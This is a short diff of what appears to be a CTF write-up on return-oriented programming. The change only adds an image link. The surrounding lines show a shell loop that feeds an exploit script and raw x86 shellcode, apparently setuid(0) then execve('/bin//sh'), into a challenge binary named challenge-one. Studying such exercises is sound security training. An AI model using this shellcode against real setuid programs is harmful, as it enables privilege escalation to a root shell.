@@ -218,6 +218,8 @@ ROP
     while true; do (python2 exp_challenge-one.py; python2 -c 'import sys;sys.stdout.write("
     \x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\
     x69\x6e\x89\xe3\xcd\x80")';cat) | ./challenge-one; done
+![image](https://github.com/user-attachments/assets/b028ca67-74cf-4166-975f-96cdd9084b5b)
+
 ------------------------------------------------------
 
     level-two
